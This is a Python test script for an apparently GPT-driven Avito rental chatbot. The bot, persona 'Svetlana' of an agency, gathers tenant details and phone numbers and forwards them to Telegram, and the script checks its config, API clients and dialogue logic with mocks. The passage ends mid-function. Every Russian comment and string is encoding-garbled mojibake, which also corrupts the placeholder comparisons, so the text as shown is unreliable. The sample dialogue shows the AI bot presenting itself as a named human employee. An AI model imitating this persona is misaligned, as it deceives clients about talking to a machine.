#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
–ö–æ–º–ø–ª–µ–∫—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è Avito Rental Bot
–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤—Å–µ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã —Å–∏—Å—Ç–µ–º—ã –ø–µ—Ä–µ–¥ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–µ–º –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω
"""

import asyncio
import aiohttp
import json
import sys
import os
import time
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, MagicMock, patch
import tempfile
import traceback

# –¶–≤–µ—Ç–∞ –¥–ª—è –∫–æ–Ω—Å–æ–ª–∏
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class TestResult:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.warnings = 0
        self.errors = []
        
    def add_pass(self, test_name):
        self.passed += 1
        print(f"{Colors.GREEN}‚úì{Colors.END} {test_name}")
        
    def add_fail(self, test_name, error=None):
        self.failed += 1
        error_msg = f": {error}" if error else ""
        print(f"{Colors.RED}‚úó{Colors.END} {test_name}{error_msg}")
        if error:
            self.errors.append(f"{test_name}: {error}")
            
    def add_warning(self, test_name, warning):
        self.warnings += 1
        print(f"{Colors.YELLOW}‚ö†{Colors.END} {test_name}: {warning}")
        
    def print_summary(self):
        total = self.passed + self.failed
        print(f"\n{Colors.BOLD}=== –†–ï–ó–£–õ–¨–¢–ê–¢–´ –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–Ø ==={Colors.END}")
        print(f"{Colors.GREEN}–ü—Ä–æ–π–¥–µ–Ω–æ: {self.passed}{Colors.END}")
        print(f"{Colors.RED}–ù–µ –ø—Ä–æ–π–¥–µ–Ω–æ: {self.failed}{Colors.END}")
        print(f"{Colors.YELLOW}–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è: {self.warnings}{Colors.END}")
        print(f"–í—Å–µ–≥–æ —Ç–µ—Å—Ç–æ–≤: {total}")
        
        if self.failed > 0:
            print(f"\n{Colors.RED}–û–®–ò–ë–ö–ò:{Colors.END}")
            for error in self.errors:
                print(f"  - {error}")
                
        success_rate = (self.passed / total * 100) if total > 0 else 0
        if success_rate >= 90:
            print(f"\n{Colors.GREEN}–°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞ –∫ –ø—Ä–æ–¥–∞–∫—à–µ–Ω—É! ({success_rate:.1f}%){Colors.END}")
        elif success_rate >= 70:
            print(f"\n{Colors.YELLOW}–°–∏—Å—Ç–µ–º–∞ —Ç—Ä–µ–±—É–µ—Ç –¥–æ—Ä–∞–±–æ—Ç–∫–∏ ({success_rate:.1f}%){Colors.END}")
        else:
            print(f"\n{Colors.RED}–°–∏—Å—Ç–µ–º–∞ –ù–ï –≥–æ—Ç–æ–≤–∞ –∫ –ø—Ä–æ–¥–∞–∫—à–µ–Ω—É ({success_rate:.1f}%){Colors.END}")

class AvitoRentalBotTester:
    def __init__(self):
        self.result = TestResult()
        self.test_data = self._load_test_data()
        
    def _load_test_data(self):
        """–¢–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤"""
        return {
            "mock_messages": [
                {
                    "id": 1,
                    "direction": "in",
                    "type": "text",
                    "created": int(time.time()) - 100,
                    "author_id": 12345,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç –∫–≤–∞—Ä—Ç–∏—Ä–∞"}
                },
                {
                    "id": 2,
                    "direction": "out", 
                    "type": "text",
                    "created": int(time.time()) - 90,
                    "author_id": 0,
                    "content": {"text": "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline"}
                }
            ],
            "mock_chats": [
                {
                    "id": "test_chat_1",
                    "context": {
                        "value": {
                            "title": "2-–∫ –∫–≤–∞—Ä—Ç–∏—Ä–∞, 60 –º¬≤, 5/9 —ç—Ç.",
                            "price_string": "45 000 ‚ÇΩ",
                            "location": {
                                "title": "–ú–æ—Å–∫–≤–∞",
                                "lat": 55.7558,
                                "lon": 37.6176
                            }
                        }
                    }
                }
            ],
            "dialog_samples": {
                "complete": """–ö–ª–∏–µ–Ω—Ç: –ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç –∫–≤–∞—Ä—Ç–∏—Ä–∞
–°–≤–µ—Ç–ª–∞–Ω–∞: –ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline
–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç
–ö–ª–∏–µ–Ω—Ç: –ë—É–¥—É –∂–∏—Ç—å —è –æ–¥–∏–Ω, –º—É–∂—á–∏–Ω–∞ 28 –ª–µ—Ç
–°–≤–µ—Ç–ª–∞–Ω–∞: –î–µ—Ç–∏ –ø–ª–∞–Ω–∏—Ä—É—é—Ç—Å—è?
–ö–ª–∏–µ–Ω—Ç: –ù–µ—Ç –¥–µ—Ç–µ–π
–°–≤–µ—Ç–ª–∞–Ω–∞: –ñ–∏–≤–æ—Ç–Ω—ã–µ –µ—Å—Ç—å?
–ö–ª–∏–µ–Ω—Ç: –ù–µ—Ç –∂–∏–≤–æ—Ç–Ω—ã—Ö
–°–≤–µ—Ç–ª–∞–Ω–∞: –û—Ç —Å–∫–æ–ª—å–∫–∏ –º–µ—Å—è—Ü–µ–≤ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞–µ—Ç–µ –∞—Ä–µ–Ω–¥—É?
–ö–ª–∏–µ–Ω—Ç: –û—Ç 12 –º–µ—Å—è—Ü–µ–≤
–°–≤–µ—Ç–ª–∞–Ω–∞: –ö–æ–≥–¥–∞ –ø–ª–∞–Ω–∏—Ä—É–µ—Ç–µ –∑–∞–µ–∑–∂–∞—Ç—å?
–ö–ª–∏–µ–Ω—Ç: –° 1 —Å–µ–Ω—Ç—è–±—Ä—è
–°–≤–µ—Ç–ª–∞–Ω–∞: –ö–∞–∫ –í–∞—Å –∑–æ–≤—É—Ç?
–ö–ª–∏–µ–Ω—Ç: –ê–ª–µ–∫—Å–µ–π
–°–≤–µ—Ç–ª–∞–Ω–∞: –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è —Å–≤—è–∑–∏?
–ö–ª–∏–µ–Ω—Ç: +7 999 123 45 67
–°–≤–µ—Ç–ª–∞–Ω–∞: –û—Ç–ª–∏—á–Ω–æ, –æ–±—Å—É–¥–∏–º –≤–∞—Å —Å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–∏—Ü–µ–π, –µ—Å–ª–∏ –æ–¥–æ–±—Ä–∏—Ç, —Ç–æ —Å–≤—è–∂–µ–º—Å—è —Å –í–∞–º–∏ü§ù [COMPLETE]""",
                "incomplete": """–ö–ª–∏–µ–Ω—Ç: –ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç –∫–≤–∞—Ä—Ç–∏—Ä–∞
–°–≤–µ—Ç–ª–∞–Ω–∞: –ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline
–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç
–ö–ª–∏–µ–Ω—Ç: –ë—É–¥—É –∂–∏—Ç—å —è –æ–¥–∏–Ω""",
            },
            "client_data_sample": {
                "name": "–ê–ª–µ–∫—Å–µ–π",
                "phone": "+7 999 123 45 67",
                "residents_info": "–º—É–∂—á–∏–Ω–∞ 28 –ª–µ—Ç",
                "residents_count": 1,
                "residents_details": "–º—É–∂—á–∏–Ω–∞ 28 –ª–µ—Ç",
                "has_children": False,
                "children_details": None,
                "has_pets": False, 
                "pets_details": None,
                "rental_period": "–æ—Ç 12 –º–µ—Å—è—Ü–µ–≤",
                "move_in_deadline": "—Å 1 —Å–µ–Ω—Ç—è–±—Ä—è"
            }
        }

    def print_header(self, title):
        """–ü–µ—á–∞—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–∞ —Ä–∞–∑–¥–µ–ª–∞ —Ç–µ—Å—Ç–æ–≤"""
        print(f"\n{Colors.CYAN}=== {title} ==={Colors.END}")

    async def test_config_validation(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò")
        
        try:
            from config import (
                OPENAI_API_KEY, OPENAI_MODEL, AVITO_USER_ID, 
                AVITO_CLIENT_ID, AVITO_CLIENT_SECRET, TELEGRAM_BOT_TOKEN,
                TELEGRAM_CHAT_ID, SYSTEM_PROMPT, EXTRACTION_PROMPT_TEMPLATE
            )
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ API –∫–ª—é—á–µ–π
            if OPENAI_API_KEY == "–í–ê–®_–ê–ü–ò_–ö–õ–Æ–ß":
                self.result.add_fail("OpenAI API –∫–ª—é—á", "–ù–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
            else:
                self.result.add_pass("OpenAI API –∫–ª—é—á –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
                
            if AVITO_CLIENT_ID == "–ö–õ–ò–ï–ù–¢_–ê–ô–î–ò":
                self.result.add_fail("Avito Client ID", "–ù–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
            else:
                self.result.add_pass("Avito Client ID –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
                
            if AVITO_CLIENT_SECRET == "–°–ò–ö–†–ï–¢_–ö–ï–ô":
                self.result.add_fail("Avito Client Secret", "–ù–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
            else:
                self.result.add_pass("Avito Client Secret –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
                
            if TELEGRAM_BOT_TOKEN == "–¢–û–ö–ï–ù_–ë–û–¢–ê":
                self.result.add_fail("Telegram Bot Token", "–ù–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
            else:
                self.result.add_pass("Telegram Bot Token –Ω–∞—Å—Ç—Ä–æ–µ–Ω")
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–∏–ø–æ–≤ –¥–∞–Ω–Ω—ã—Ö
            if isinstance(AVITO_USER_ID, int) and AVITO_USER_ID > 0:
                self.result.add_pass("Avito User ID –∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω")
            else:
                self.result.add_fail("Avito User ID", "–î–æ–ª–∂–µ–Ω –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—ã–º —á–∏—Å–ª–æ–º")
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–º–ø—Ç–æ–≤
            if len(SYSTEM_PROMPT) > 100:
                self.result.add_pass("–°–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ–º–ø—Ç –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç")
            else:
                self.result.add_fail("–°–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ–º–ø—Ç", "–°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç")
                
            if "{dialog_history}" in EXTRACTION_PROMPT_TEMPLATE:
                self.result.add_pass("–ü—Ä–æ–º–ø—Ç –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω")
            else:
                self.result.add_fail("–ü—Ä–æ–º–ø—Ç –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö", "–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä {dialog_history}")
                
        except ImportError as e:
            self.result.add_fail("–ò–º–ø–æ—Ä—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏", str(e))

    async def test_avito_client(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ Avito API –∫–ª–∏–µ–Ω—Ç–∞"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï AVITO API –ö–õ–ò–ï–ù–¢–ê")
        
        try:
            from avito import AvitoClient
            
            # –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∏–µ–Ω—Ç–∞
            client = AvitoClient("test_user", "test_client", "test_secret")
            self.result.add_pass("–°–æ–∑–¥–∞–Ω–∏–µ AvitoClient")
            
            # –¢–µ—Å—Ç —Å –º–æ–∫-–¥–∞–Ω–Ω—ã–º–∏
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 200
                mock_response.json.return_value = {"access_token": "test_token"}
                mock_post.return_value.__aenter__.return_value = mock_response
                
                await client._get_token()
                if client.access_token == "test_token":
                    self.result.add_pass("–ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞")
                else:
                    self.result.add_fail("–ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞", "–¢–æ–∫–µ–Ω –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
                    
            # –¢–µ—Å—Ç –ø–æ–ª—É—á–µ–Ω–∏—è —á–∞—Ç–æ–≤
            with patch('aiohttp.ClientSession.get') as mock_get:
                mock_response = AsyncMock()
                mock_response.json.return_value = {"chats": self.test_data["mock_chats"]}
                mock_get.return_value.__aenter__.return_value = mock_response
                
                client.session = AsyncMock()
                client.session.get.return_value.__aenter__.return_value = mock_response
                
                chats = await client.get_chats()
                if isinstance(chats, list) and len(chats) > 0:
                    self.result.add_pass("–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —á–∞—Ç–æ–≤")
                else:
                    self.result.add_fail("–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —á–∞—Ç–æ–≤", "–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –æ—Ç–≤–µ—Ç–∞")
                    
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ AvitoClient", str(e))

    async def test_openai_integration(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ —Å OpenAI"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï OPENAI –ò–ù–¢–ï–ì–†–ê–¶–ò–ò")
        
        try:
            from chat_gpt import ChatGPTHandler, get_agent_response, extract_final_client_data
            
            # –°–æ–∑–¥–∞–Ω–∏–µ —Ö–µ–Ω–¥–ª–µ—Ä–∞
            handler = ChatGPTHandler("test_key", "gpt-4o-mini")
            self.result.add_pass("–°–æ–∑–¥–∞–Ω–∏–µ ChatGPTHandler")
            
            # –¢–µ—Å—Ç —Å –º–æ–∫-–æ—Ç–≤–µ—Ç–æ–º
            with patch.object(handler, '_make_request') as mock_request:
                mock_request.return_value = "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline"
                
                response = await handler.generate_response("test dialog", True)
                if response and "–°–≤–µ—Ç–ª–∞–Ω–∞" in response:
                    self.result.add_pass("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –æ—Ç–≤–µ—Ç–∞ –∞–≥–µ–Ω—Ç–∞")
                else:
                    self.result.add_fail("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –æ—Ç–≤–µ—Ç–∞ –∞–≥–µ–Ω—Ç–∞", "–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –æ—Ç–≤–µ—Ç")
                    
            # –¢–µ—Å—Ç –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
            with patch.object(handler, '_make_request') as mock_request:
                mock_request.return_value = json.dumps(self.test_data["client_data_sample"])
                
                client_data = await handler.extract_client_data(self.test_data["dialog_samples"]["complete"])
                if client_data and "name" in client_data:
                    self.result.add_pass("–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–∞")
                else:
                    self.result.add_fail("–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∫–ª–∏–µ–Ω—Ç–∞", "–î–∞–Ω–Ω—ã–µ –Ω–µ –∏–∑–≤–ª–µ—á–µ–Ω—ã")
                    
            # –¢–µ—Å—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ—Å—Ç–∏
            complete_response = "–û—Ç–ª–∏—á–Ω–æ, –æ–±—Å—É–¥–∏–º –≤–∞—Å —Å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–∏—Ü–µ–π [COMPLETE]"
            incomplete_response = "–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –∫—Ç–æ –ø—Ä–æ–∂–∏–≤–∞—Ç—å –ø–ª–∞–Ω–∏—Ä—É–µ—Ç"
            
            if handler.is_dialog_complete(complete_response):
                self.result.add_pass("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ–≥–æ –¥–∏–∞–ª–æ–≥–∞")
            else:
                self.result.add_fail("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ–≥–æ –¥–∏–∞–ª–æ–≥–∞", "–ù–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω –º–∞—Ä–∫–µ—Ä –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è")
                
            if not handler.is_dialog_complete(incomplete_response):
                self.result.add_pass("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –Ω–µ–∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ–≥–æ –¥–∏–∞–ª–æ–≥–∞")
            else:
                self.result.add_fail("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –Ω–µ–∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ–≥–æ –¥–∏–∞–ª–æ–≥–∞", "–õ–æ–∂–Ω–æ–µ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–µ")
                
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ OpenAI –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏", str(e))

    async def test_telegram_integration(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏ —Å Telegram"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï TELEGRAM –ò–ù–¢–ï–ì–†–ê–¶–ò–ò")
        
        try:
            from telegram import TelegramBot, send_completed_application
            
            # –°–æ–∑–¥–∞–Ω–∏–µ –±–æ—Ç–∞
            bot = TelegramBot("test_token")
            self.result.add_pass("–°–æ–∑–¥–∞–Ω–∏–µ TelegramBot")
            
            # –¢–µ—Å—Ç –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 200
                mock_post.return_value.__aenter__.return_value = mock_response
                
                success = await bot.send_message("test_chat", "test message")
                if success:
                    self.result.add_pass("–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram")
                else:
                    self.result.add_fail("–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram")
                    
            # –¢–µ—Å—Ç —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∑–∞—è–≤–∫–∏
            with patch.object(bot, 'send_message') as mock_send:
                mock_send.return_value = True
                
                success = await bot.send_client_info(
                    self.test_data["client_data_sample"], 
                    "test_chat",
                    self.test_data["mock_chats"][0]["context"]["value"]
                )
                
                if success and mock_send.called:
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω—É–∂–Ω—ã–µ –ø–æ–ª—è
                    call_args = mock_send.call_args[0]
                    message_text = call_args[1]
                    
                    required_fields = ["–ù–û–í–ê–Ø –ó–ê–Ø–í–ö–ê", "–ê–ª–µ–∫—Å–µ–π", "+7 999 123 45 67"]
                    if all(field in message_text for field in required_fields):
                        self.result.add_pass("–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞—è–≤–∫–∏ –∫–ª–∏–µ–Ω—Ç–∞")
                    else:
                        self.result.add_fail("–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞—è–≤–∫–∏ –∫–ª–∏–µ–Ω—Ç–∞", "–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è")
                else:
                    self.result.add_fail("–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞—è–≤–∫–∏ –∫–ª–∏–µ–Ω—Ç–∞")
                    
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ Telegram –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–∏", str(e))

    async def test_main_bot_logic(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Å–Ω–æ–≤–Ω–æ–π –ª–æ–≥–∏–∫–∏ –±–æ—Ç–∞"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –û–°–ù–û–í–ù–û–ô –õ–û–ì–ò–ö–ò –ë–û–¢–ê")
        
        try:
            from main import AvitoRentalBot
            
            # –°–æ–∑–¥–∞–Ω–∏–µ –±–æ—Ç–∞
            bot = AvitoRentalBot()
            self.result.add_pass("–°–æ–∑–¥–∞–Ω–∏–µ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±–æ—Ç–∞")
            
            # –¢–µ—Å—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –ú–°–ö
            moscow_time = bot.get_moscow_time()
            if moscow_time.tzinfo is not None:
                self.result.add_pass("–ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –ú–°–ö")
            else:
                self.result.add_fail("–ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –ú–°–ö", "–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç timezone")
                
            # –¢–µ—Å—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–±–æ—á–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏
            work_time = moscow_time.replace(hour=12, minute=0)  # 12:00 - —Ä–∞–±–æ—á–µ–µ –≤—Ä–µ–º—è
            non_work_time = moscow_time.replace(hour=23, minute=0)  # 23:00 - –Ω–µ—Ä–∞–±–æ—á–µ–µ –≤—Ä–µ–º—è
            
            if bot.is_work_time(work_time) and not bot.is_work_time(non_work_time):
                self.result.add_pass("–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–±–æ—á–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏")
            else:
                self.result.add_fail("–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–±–æ—á–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏", "–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ")
                
            # –¢–µ—Å—Ç —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –¥–∏–∞–ª–æ–≥–∞
            formatted = bot.format_dialog_history(self.test_data["mock_messages"])
            if "–ö–ª–∏–µ–Ω—Ç:" in formatted and "–°–≤–µ—Ç–ª–∞–Ω–∞:" in formatted:
                self.result.add_pass("–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –¥–∏–∞–ª–æ–≥–∞")
            else:
                self.result.add_fail("–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ –¥–∏–∞–ª–æ–≥–∞", "–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç")
                
            # –¢–µ—Å—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —ç—Ç–∞–ø–∞ –¥–∏–∞–ª–æ–≥–∞
            stage = bot.determine_dialog_stage(self.test_data["mock_messages"])
            if stage in ["greeting", "residents", "children", "pets", "rental_period", "deadline", "contacts", "complete"]:
                self.result.add_pass("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —ç—Ç–∞–ø–∞ –¥–∏–∞–ª–æ–≥–∞")
            else:
                self.result.add_fail("–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —ç—Ç–∞–ø–∞ –¥–∏–∞–ª–æ–≥–∞", f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —ç—Ç–∞–ø: {stage}")
                
            # –¢–µ—Å—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ—Å—Ç–∏ –¥–∏–∞–ª–æ–≥–∞
            complete_messages = [
                {"direction": "in", "type": "text", "content": {"text": "–ê–ª–µ–∫—Å–µ–π"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "+7 999 123 45 67"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "–±—É–¥—É –∂–∏—Ç—å –æ–¥–∏–Ω"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "–æ—Ç 12 –º–µ—Å—è—Ü–µ–≤"}, "author_id": 123},
                {"direction": "in", "type": "text", "content": {"text": "—Å 1 —Å–µ–Ω—Ç—è–±—Ä—è"}, "author_id": 123}
            ]
            
            if bot.is_dialog_complete_check(complete_messages):
                self.result.add_pass("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ—Å—Ç–∏ –¥–∏–∞–ª–æ–≥–∞")
            else:
                self.result.add_fail("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω–æ—Å—Ç–∏ –¥–∏–∞–ª–æ–≥–∞", "–ù–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—ã–π –¥–∏–∞–ª–æ–≥")
                
            # –¢–µ—Å—Ç —Ä–∞—Å—á–µ—Ç–∞ follow-up –≤—Ä–µ–º–µ–Ω–∏
            base_time = time.time()
            next_time = bot.calculate_next_followup_time(base_time, 3600)  # +1 —á–∞—Å
            if next_time > base_time:
                self.result.add_pass("–†–∞—Å—á–µ—Ç –≤—Ä–µ–º–µ–Ω–∏ follow-up")
            else:
                self.result.add_fail("–†–∞—Å—á–µ—Ç –≤—Ä–µ–º–µ–Ω–∏ follow-up", "–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ –≤—Ä–µ–º—è")
                
        except Exception as e:
